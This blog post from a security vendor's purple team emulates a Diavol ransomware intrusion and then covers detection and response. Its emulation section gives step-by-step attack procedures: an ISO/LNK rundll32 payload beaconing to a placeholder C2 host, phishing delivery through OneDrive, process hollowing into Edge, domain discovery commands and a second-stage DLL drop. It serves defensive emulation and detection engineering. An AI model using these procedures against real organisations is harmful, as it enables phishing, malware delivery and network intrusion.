With you this week we have Nathali Cano](https://www.scythe.io/authors/nathali-cano)\n(CTI), [Jorge Orchilles (Attack), and](https://www.scythe.io/about/jorge-orchilles) [Chris Peacock (Detection Engineer focused on detection](https://www.scythe.io/authors/christopher-peacock)\n[and response). Big shout out to The DFIR Report for providing the report which served as](https://thedfirreport.com/)\nour starting point. [We sponsor them and you should too!](https://www.patreon.com/thedfirreport/)\n\nIf you are joining us from the SANS CTI Summit or Cactus Con where Operationalized\n[Purple Teaming was presented, welcome! Our Purple Team Exercise Framework that covers](https://www.scythe.io/ptef)\n[the process is available on our GitHub.](https://github.com/scythe-io/purple-team-exercise-framework)\n\n## Cyber Threat Intelligence\n\n[The cyber threat intelligence for this #ThreatThursday is provided by The DFIR Report on](https://www.scythe.io/threatthursday)\n[Diavol Ransomware published December 13, 2021. As usual, we analyze the report, extract](https://thedfirreport.com/2021/12/13/diavol-ransomware/)\nTTPs at the procedure level, map to MITRE ATT&CK, and build an adversary emulation plan\nthat your organization can leverage to Attack, Detect, and Respond.\n\nAs is typical in ransomware attacks, we see three different groups at work:\n\n1. Initial access and execution by an Initial Access Broker. In this case, BazarLoader was\n\nleveraged to gain initial access using a number of defense evasion techniques\nincluding spearphishing with public OneDrive links, to download a ZIP, containing an\nISO, containing a shortcut (LNK file), that executes rundll32.exe, and then process\ninjection into a more obvious executable, msedge.exe.\n2. Manual procedures by a threat actor to perform discovery, credential access,\n\npersistence, lateral movement, collection, and exfiltration.\n3. Ransomware dropped by an affiliate to encrypt files and extort the organization, the\n\nDiavol ransomware.\n\n\n-----\n\nThis particular attack leveraged multiple payloads and command and control (C2) servers\nover a 3 day period due to the multiple parties involved. The DFIR Report does a great job\nsummarizing the entire case so we will just post that here for your review:\n\n_The malware (BazarLoader) was delivered to an endpoint via email, which included a link to_\n_OneDrive. The OneDrive link, directed the user to download a file that was a zip, which_\n_included an ISO inside. Once opened (mounted) on the users system, it was determined the_\n_ISO contained a LNK file and a DLL. The LNK file masqueraded as a Document enticing the_\n_user to click/open it. Once the user executed the LNK file, the BazarLoader infection was_\n_initiated._\n\n_As seen in previous cases, the BazarLoader infection began with internal reconnaissance of_\n_the environment using Windows utilities such as net, nltest, and ipconfig. After being inactive_\n_for one hour, the intrusion continued with dropping of multiple Cobalt Strike beacon DLL’s on_\n_the beachhead. This was followed by another round of discovery from the compromised_\n_machine. The threat actor then proceeded with execution of adf.bat, which is a script that_\n_queries various Active Directory objects using the AdFind tool. The first run was using a_\n_renamed binary named qq.exe and then the threat actor later dropped a properly named_\n_AdFind binary and executed the same discovery commands again. Soon after that, with the_\n_use of another simple batch script named fodhelper_reg_hashes.bat, they performed_\n_credentials acquisition via dumping of SAM, SECURITY and SYSTEM registry hives._\n\n_Returning after a gap of almost 18 hours, the threat actor performed another round of_\n_network scanning from the beachhead. This was then followed by attempts to Kerberoast_\n_and “AS-REProast” using the tool Rubeus. The threat actor then moved laterally via RDP to_\n_a server that contained file shares. After gaining access to the system they installed a remote_\n_access application, AnyDesk, as well as Filezilla._\n\n_The threat actors used FileZilla to exfiltrate data out of the environment. They then pivoted_\n_towards critical systems, such as domain controllers and a server that held backups. The_\n_threat actor then dumped LSASS from one of the domain controllers, using task manager,_\n_and then uploaded the dump file to ufile.io using Internet Explorer._\n\n\n-----\n\n_On the backup server, the threat actors attempted to dump databases associated with the_\n_backup solution. In one attempt, they used a documented technique to recover the encoded_\n_password and decode it using the Microsoft Data Protection API (DPAPI)._\n\n_After around 42 hours post initial intrusion, the threat actors pushed towards completion of_\n_their final objective. RDP access was established from the central file server that the threat_\n_actors had compromised to all endpoints and a batch script named “kill.bat” was executed on_\n_all of the targeted machines._\n\n_The script consists of commands that removes Volume Shadow copies, disables Windows_\n_automatic startup repair, and stops all the running services on the host. Once the script_\n_completed execution, the Diavol Ransomware was deployed via the RDP connection on_\n_each machine by running the executable manually. From initial access, to ransomware_\n_deployment, the threat actors took about 42 hours to deploy ransomware domain wide, but_\n_from the login on the third day, to the last host ransom execution, only about an hour passed_\n_for the actors to finish their deployment._\n\nThe DFIR Report also maps to MITRE ATT&CK and provides the mapping at the bottom of\nthe report:\n\n_Spearphising Link – T1566.002_\n_BITS Jobs – T1197_\n_Kerberoasting – T1558.003_\n_AS-REP Roasting – T1558.004_\n_Credentials in Registry – T1552.002_\n_Remote Desktop Protocol – T1021.001_\n_Exfiltration to Cloud Storage – T1567.002_\n_OS Credential Dumping – T1003_\n_SMB/Windows Admin Shares – T1021.002_\n_System Owner/User Discovery – T1033_\n_Network Service Scanning – T1046_\n_Process Injection – T1055_\n_PowerShell – T1059.001_\n_Domain Groups – T1069.002_\n_File and Directory Discovery – T1083_\n_Access Token Manipulation – T1134_\n_Network Share Discovery – T1135_\n_Domain Trust Discovery – T1482_\n\n\n-----\n\n_Data Encrypted for Impact – T1486_\n_Disable or Modify Tools – T1562.001_\n_Valid Accounts – T1078_\n\nThis is all fantastic and shows the evolution of Cyber Threat Intelligence from Indicators of\nCompromise (IoCs) to Indicators of Behaviors (IoBs). However, MITRE ATT&CK mapping is\nat the technique level and we need procedure level information to emulate the adversary and\nperform detection engineering. This is a major gap we continue to see in most CTI providers.\nLucky for all of us, The DFIR Report does provide procedure level information in the report.\n\n## Extracting procedure level CTI\n\nOur next step is extracting procedure level CTI that is actionable for Attack, Detect, and\nRespond. We work together as an internal purple team to map the CTI to Tactic, Technique,\nProcedure and the procedure we are capable of as the attacker. Procedure level information\nis often missing and we have to be creative in the procedure we perform to most closely\nemulate the adversary.\n\nLet’s do an example together. The first paragraph from The DFIR Report summary states:\n\n_The malware (BazarLoader) was delivered to an endpoint via email, which included a link to_\n_OneDrive. The OneDrive link, directed the user to download a file that was a zip, which_\n_included an ISO inside. Once opened (mounted) on the users system, it was determined the_\n_ISO contained a LNK file and a DLL. The LNK file masqueraded as a Document enticing the_\n_user to click/open it. Once the user executed the LNK file, the BazarLoader infection was_\n_initiated._\n\nWe convert this over to Tactic, Technique, Procedure, and then Red Team Procedure. In this\ncase, we will be emulating with SCYTHE so we are adding the exact steps:\n\nWe continued extracting procedures and building out the adversary emulation plan\nprocedure per procedure. Given the multiple payloads used, we had to understand the timing\nand execution of each procedure to more accurately build the adversary emulation plan. Our\n[Google Sheet is available here if you would like to take a look at the entire multi-stage attack.](https://docs.google.com/spreadsheets/d/136SX5rxqmSlYSgK9Id_GDA7toMzMh-dwzEGxDGIgIUU/edit?usp=sharing)\n\n\n-----\n\n## Emulating the Attack\n\nThis is a multi-stage attack leveraging multiple payloads and execution that performs\nnumerous different TTPs. Manual emulation steps are below and automated steps for\nSCYTHE users are available in our Community Threats GitHub. In this post we will focus on\nStage 0 and the dropping of Stage 1 through Process Hollowing.\n\n## Diavol Stage 0\n\nThe initial access stage of this campaign leveraged multiple defense evasion procedures to\ndrop BazarLoader. From the attacker perspective, we start in a different procedure than the\nCTI and Incident Response observed; we must first set up the Command and Control\ninfrastructure. With SCYTHE, it is very easy to start a new campaign so we will skip those\nsteps and begin right at downloading the payload.\n\n1. Start a campaign using the following communication parameters `--cp\n\nyourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10`,\ndownload the DLL and set the entry point of `BasicScore` and save it as\n`ShareFiles.dll`\n\n\n-----\n\n[1. Copy the src folder from our Compound Actions GitHub for T1553.005 to a working](https://github.com/scythe-io/compound-actions/tree/main/T1553.005%20-%20Mark-of-the-Web%20Bypass/src)\n\ndirectory on your Windows system.\n2. Put the SCYTHE DLL in the Folder2Iso of the working directory.\n3. In the Folder2Iso directory, create a shortcut called `Documents` and set the `Target`\n\nto: `C:\\Windows\\System32\\rundll32.exe SharedFiles.dll,BasicScore`\n\n\n-----\n\n1. Open a Windows command prompt and `cd` to the working directory.\n2. Run `Folder2Iso.exe \"Folder2Iso\" \"%USERPROFILE%\\Downloads\\new-documents\n2005.iso\" \"Diavol\" 0 0 0 \"None\"` This will take all the content of the Folder2Iso folder\nand create an ISO of it.\n3. Zip the ISO and call it `new-documents-2005.zip`\n4. Upload the zip file to Microsoft OneDrive and copy the link.\n5. Send a phishing email with the link to the Microsoft OneDrive zip file.\n6. If the end user downloads the ZIP and double clicks the ISO, it will be mounted on their\n\nendpoint. The user will need to double click the shortcut to begin execution.\n\nOnce the shortcut is executed, a new client will connect to the SCYTHE server. As we are\nmanually emulating this activity, you will need to create the Diavol Stage 1 campaign first,\ndownload the EXE and upload it to the Virtual File System under\n\n\n-----\n\nVFS:/shared/Diavol/DiavolStage1.exe\n\nThe last steps of Diavol Stage 0 are performing process injection into Microsoft Edge. The\nCTI does not provide procedure level details as to how process injection occurred: “The\n_threat actors made use of process injection through-out the intrusion. The BazaLoader_\n_malware injected into an Edge browser process, as observed by the discovery activity”._\n\n[We know process injections maps to MITRE ATT&CK Technique T1055 but that technique](https://attack.mitre.org/techniques/T1055/)\nhas 11 sub-techniques. This is an example where the red team will need to be creative and\nimprovise on which procedure to use. In our case, we are going to go with Process Hollowing\nT1055.012 to attempt to continue evading detection. Process hollowing is performed by\nstarting a process in a suspended state, unmapping (hollowing) its memory, and replacing it\nwith our payload.\n\n1. Load the process hollowing module: ```loader --load scythe.phollowing```\n2. Inject DiavolStage1 into msedge: ```scythe.phollowing --src\n\nVFS:/shared/Diavol/DiavolStage1.exe --target \"C:\\Program Files\n(x86)\\Microsoft\\Edge\\Application\\msedge.exe\"```\n3. Shutdown Diavol Stage 0: ```controller --shutdown```\n\n## Diavol Stage 1\n\nManual execution of discovery activity started 14 minutes after initial access:\n\n```\n\nloader --load run\n\nrun net group /domain\n\nrun net group /domain \"Domain Admins\"\n\nrun net group \"Domain Computers\" /domain\n\nrun net localgroup administrators\n\nrun net view /all\n\nrun nltest /domain_trusts /all_trusts\n\n```\n\n\n-----\n\n59 minutes after discovery, another payload was dropped and executed:\n\n```\n\nloader --load downloader\n\ndownloader --src \"VFS:/shared/Diavol/tfpkuengdlu.dll\" --dest\n\"%USERPROFILE%\\AppData\\Local\\Temp\\tfpkuengdlu.dll\"\n\nrun rundll32.exe \"%USERPROFILE%\\AppData\\Local\\Temp\\tfpkuengdlu.dll\",EnterDll\n\ncontroller --shutdown\n\n```\n\n## Detection Opportunities\n\nThere are multiple detection opportunities along the kill chain. The delivery phase is complex\ndue to ZIP files commonly being downloaded from cloud vendors. Therefore, it is\nrecommended to leverage decryption at your firewalls and sandbox these files on their\ningress. We’ll cover the detection opportunities that follow the ZIP delivery and begin with it\nbeing unzipped.\n\n## Diavol Stage 0 Detections\n\nTo summarize this stage, the threat actor is trying to get their stager into an environment,\nhave a user execute the stager, and then have the stager process inject the payload via\nprocess hollowing into Microsoft Edge. If you’re mapping to the Kill Chain, this would be the\nDelivery, Exploitation, and Installation phases. It’s important to note that exploitation isn’t\nalways a technical exploit, but in cases such as this, it can be human exploitation to get code\nexecution.\n\n### New ISO File\n\nWhen the ZIP file is decompressed, it will write the ISO file. ISO files are uncommon for\nworkers outside of IT Administration. Therefore, we recommend alerting on new ISO files for\nworkers outside of IT. Depending on your monitoring tool, you can filter by users,\nworkstations, or groups. Below is an example of the file write event from unzipping the ZIP\nfile.\n\n\n-----\n\n### Mounting of an ISO\n\nIf we cannot catch the new ISO, the following detection opportunity is to catch the malicious\nISO being mounted. Once again filtering will have to be conducted for those users,\ncomputers, or groups where software installation is typical. We recommend the SIGMA ISO\nImage Mount Rule to detect this using Windows Security Logs. Please note there is an\nadvanced audit policy to adjust for this to be logged.\n\n### Rundll32\n\nThere are multiple detection opportunities around runddl32 in this plan, and we’ll address\nthem in a layered alert approach. Some may be simple to implement in your environment,\nwhile others may be more difficult but offer greater detection value.\n\n**Command Line Contains Rundll32**\n\nWhen actors conduct this technique, they pass a command that calls rundll32 and points it at\na malicious dll they’ve crafted. In our example, the command was\n_“C:\\Windows\\System32\\rundll32.exe” SharedFiled.dll,BasicScore. So, we look for any_\ncommand line that contains the string rundll32.exe. We can baseline this in the environment\nand alert when new suspicious events occur. To help generate fields to baseline, we\n[recommend using the Rundll32 Without Parameters SIGMA Rule for this detection logic. If](https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_rundll32_without_parameters.yml)\nunable to baseline, the organization can hunt for rare occurrences instead. Below we can\nsee our emulation command at the top of our search and may decide to alert anytime\nsvchost.exe is not the Parent Image.\n\n\n-----\n\n**Rundll32 with Parent Process of Explorer.exe**\n\nDue to the execution coming from clicking the LNK file, the parent process of rundll32.exe is\nexplorer.exe. This parent-child relationship is uncommon, though each environment is unique\nand may need baselining. As you can see below, our environment had no previous events\nfor this alert logic before testing.\n\n**Rundll32 with Abnormal Current Directory**\n\nIt’s very unusual to see rundll32 being executed from a drive other than the C: drive.\nTherefore we can write a detection to look for a process of rundll32.exe with a current\ndirectory other than the C drive. Therefore, searching for a process of rundll32.exe with a\ncurrent directory not containing “C:\\” resolved only in true positives, as shown below. We’ve\n[also submitted the logic to SIGMA for incorporation.](https://github.com/SigmaHQ/sigma/pull/2605/commits/076b0c92467cc6a3f1eedad11e99169969523d72)\n\n\n-----\n\n**Rundll32 with Network Connection**\n\nEvery environment is unique; therefore, there are different ways you may implement this\nlogic that works for you. The easiest way to implement this is to search for a process of\nrundll32.exe making a network connection. In our example, we searched for rundll32.exe\nand the field destination IP exists. Our 30 day search only returned true positives to our\ninternal SCYTHE Server, as you can see below.\n\nIf you have too much internal traffic to tune, you may want to start with just catching\noutbound connections. For this, we recommend starting with the SIGMA Rundll32 Internet\nConnection rule.\n\n\n-----\n\n### Process Hollowing Detection\n\nAn EDR should detect this. It’s worth noting, though, if the alert is responded to by an analyst\nor not. Suppose there are too many false positives for the process hollowing alert generated\nby this emulation. In that case, you should seek to baseline the alert for your environment so\nit may be responded to. If you are layering an EDR with Sysmon or only running Sysmon,\nyou must implement logic. First, you will need to ensure that Sysmon and its configuration\nare up to date, as this functionality was released in 2021 in Sysmon 13. See Microsoft\nSysmon now detects malware process tampering attempts. Once you collect the appropriate\ntelemetry, the detection logic is to alert on an event code of 25 with a Type of Image is\n_replaced. This will detect when an in-memory process image does not match the disk image_\nbecause the process hollowing replaces it. At the time of this writing, we have submitted this\n[logic to SIGMA and it should be available here as sysmon_process_hollowing.yml shortly, if](https://github.com/SigmaHQ/sigma/tree/master/rules/windows/sysmon)\nnot already.\n\n## Diavol Stage 1 Detections\n\nThis stage is where the threat actor enumerates the environment. Now that the actor has\ninjected the payload process, common enumeration commands are conducted leveraging\nnet and nltest commands. If you are mapping to the Kill Chain, this would be where the actor\nhas gotten to Actions on Objectives as they are actively running commands on target. You\ncan see the commands laid out in the SCYTHE screenshot below.\n\n\n-----\n\n### Suspicious Net Commands\n\nThe commands conducted by the adversary and the emulation plan are commonly seen in\nBazarLoader and ransomware attacks. These commands are indicative of enumerating the\nenvironment a threat actor is operating in. To detect this enumeration activity we recommend\nthe [Net.exe Execution SIGMA Rule. The logic is looking for net.exe or net1.exe with a](https://github.com/SigmaHQ/sigma/blob/777d218adc789b7f1b146701793e78799324d87d/rules/windows/process_creation/win_susp_net_execution.yml)\ncommand line containing strings of group, localgroup, user, view, share, accounts, stop, or\nstar. In the image below, all commands in steps three through seven were picked up by the\nrule search.\n\n\n-----\n\n### Suspicious Nltest Commands\n\nFor detecting the domain trust enumeration conducted in step 8, we recommend the SIGMA\nRecon Activity with NLTEST Rule and provide a screenshot of it below. Depending on your\nenvironment, it may be possible for you to baseline and flag on any nltest.exe execution. It’s\n[worth noting the Domain Trust Discovery SIGMA Rule is also applicable.](https://github.com/SigmaHQ/sigma/blob/11164849b3595a427c4ee9c5fe8ccfa3d78aa989/rules/windows/process_creation/win_trust_discovery.yml)\n\n## Respond\n\n\n-----\n\nIf any of the alerts are detected in the environment, the response team should determine the\ndepth of the Kill Chain, collect artifacts, and answer the following questions:\n\nWas the installation successful?\n\nWhat are the persistent mechanisms?\n\nIs Command & Control (C2) successful?\n\nWhat are the domain names, IP addresses, ports and protocols used?\n\nAre there observations of Actions on Objectives (AOO)?\n\nIf so, what are they?\nDid it move to other hosts?\nWas any sensitive data taken?\n\nUsernames?\nPasswords?\nOther?\n\nWhat was the infection vector?\n\nHow was it delivered?\nWhat exploitation led to installation?\n\nOnce it has been determined how deep the intrusion goes, containment, eradication, and\nrecovery should begin. After recovery, lessons learned should drive additional courses of\naction (COAs) to thwart the threat should it return, such as implementing additional security\ncontrols. As always, please follow your organization's response plan and evidence retention\n[policies. We also recommend leveraging NIST SP 800-61 Rev. 2.](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf)\n\n## Conclusion\n\nOur internal purple team took the cyber threat intelligence from The DFIR Report, extracted\nthe procedures mapped to ATT&CK, built and shared an adversary emulation plan, emulated\nthe attack, and covered multiple detection opportunities. This was a multi-stage attack with 3\n\n\n-----\n\ndifferent threat actors working together to gain initial access, propagate through the\nenvironment, and leverage the Diavol ransomware for double extortion. We would like to\nthank [The DFIR Report for the detailed reporting. The procedure-level ATT&CK mapping and](https://thedfirreport.com/2021/12/13/diavol-ransomware/)\n[plan is available on this Google Sheet if you would like to take a look at the entire multi-stage](https://docs.google.com/spreadsheets/d/136SX5rxqmSlYSgK9Id_GDA7toMzMh-dwzEGxDGIgIUU/edit?usp=sharing)\nattack planning phase. Lastly, manual and automated emulationation steps are available to\nthe community on GitHub.\n\nAuthors: Jorge Orchilles, Chris Peacock, Nathali Cano\n\n\n-----",
